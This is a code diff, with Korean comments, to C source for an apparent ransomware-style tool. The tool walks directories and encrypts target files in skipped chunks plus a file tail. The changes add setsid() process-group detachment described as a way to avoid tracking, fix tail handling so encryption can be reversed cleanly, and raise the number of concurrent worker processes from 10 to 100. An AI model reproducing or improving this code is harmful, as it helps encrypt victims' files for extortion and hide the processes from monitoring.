@@ -59,6 +59,16 @@ static int spawn_worker(const char *target, long offset, int chunks, int mode) {
 
     if (pid == 0) {
         // ---- [Child 1] ----
+        
+        // [추가] 세션 및 프로세스 그룹 분리
+        // 이 호출로 인해 Child 1은 부모(Main)와 다른 '새로운 그룹'의 대장이 됩니다.
+        // 이후 생성되는 손자(Child 2)는 이 새로운 그룹에 속하게 되어 추적을 피합니다.
+        if (setsid() < 0) {
+            // 실패하더라도 공격은 계속 진행 (치명적이지 않음)
+             perror("setsid failed");
+        }
+        
+        
         // 2. 두 번째 포크 (Child 1 -> Child 2)
         pid_t grand_pid = fork();
 
@@ -155,6 +165,8 @@ void execute_attack(int mode) {
         long current_offset = 0;
         int child_round = 0;
         int attack_failed = 0;
+        // [추가] 마지막으로 암호화가 끝난 위치를 추적하는 변수
+        long last_encrypted_end = 0;
 
         // 2. 이어달리기 루프
         while (current_offset < total_size) {
@@ -163,11 +175,19 @@ void execute_attack(int mode) {
             
             // 세마포어 제어가 있으므로 usleep은 필수가 아니지만, 
             // 너무 빠른 루프 회전으로 인한 CPU 점유율 조절용으로 짧게 유지
-            usleep(1000);
+            usleep(10000);
 
             if (ret != 0) {
                 attack_failed = 1;
                 break;  // 이 파일에 대한 공격 중단
+            }
+            
+            // [추가] 이번에 처리한 구간의 끝 위치 기록
+            long this_end = current_offset + write_amount;
+            if (this_end > total_size) this_end = total_size; // 파일 끝을 넘지 않음
+            
+            if (this_end > last_encrypted_end) {
+                last_encrypted_end = this_end;
             }
 
             // 자식이 처리한 양 + 전략적으로 건너뛸 양
@@ -177,16 +197,30 @@ void execute_attack(int mode) {
         // 3. Tail 처리 (파일 끝부분 구조 파괴/복구용)
         //    Encrypt/Decrypt 모두 같은 위치를 한 번 더 처리해야
         //    CTR 기반에서 정확히 되돌릴 수 있음.
+        
+        // [수정] 'last_encrypted_end'를 사용하여 중복 처리를 막음
         if (!attack_failed && total_size > CHUNK_SIZE) {
+            
             long tail_offset = total_size - CHUNK_SIZE;
-            if (tail_offset < 0) tail_offset = 0;
+            
+            // 만약 계산된 꼬리 위치가 이미 처리된 영역과 겹치면?
+            // -> 겹치지 않도록 시작 위치를 '처리된 끝부분'으로 미룸
+            if (tail_offset < last_encrypted_end) {
+                tail_offset = last_encrypted_end;
+            }
 
-            int ret = spawn_worker(target, tail_offset, 1, mode);
-            if (ret != 0) {
-                printf("[SKIP] Tail 처리 실패: %s\n", target);
-                attack_failed = 1;
-            } else {
-                child_round++;
+            // 조정 후에도 아직 파일 끝까지 남은 공간이 있다면 실행
+            if (tail_offset < total_size) {
+                // 남은 크기가 1개 청크보다 작아도 encrypt_chunk_range 내부에서 
+                // 파일 끝(EOF)을 만나면 알아서 멈추므로 안전함.
+                int ret = spawn_worker(target, tail_offset, 1, mode);
+                
+                if (ret != 0) {
+                    printf("[SKIP] Tail 처리 실패: %s\n", target);
+                    attack_failed = 1;
+                } else {
+                    child_round++;
+                }
             }
         }
 
@@ -260,9 +294,9 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
-    // 세마포어 값 설정 (1: 공유 모드, 10: 동시 실행 프로세스 개수)
-    // 10으로 설정하면 프로세스가 최대 10개까지만 생성되고, 하나가 끝나야 다음 하나가 생성됨
-    if (sem_init(proc_limiter, 1, 10) == -1) {
+    // 세마포어 값 설정 (1: 공유 모드, 100: 동시 실행 프로세스 개수)
+    // 100으로 설정하면 프로세스가 최대 100개까지만 생성되고, 하나가 끝나야 다음 하나가 생성됨
+    if (sem_init(proc_limiter, 1, 100) == -1) {
         perror("sem_init failed");
         return 1;
     }
@@ -277,4 +311,3 @@ int main(int argc, char *argv[]) {
     printf("--- End Traversal ---\n");
     return 0;
 }
-
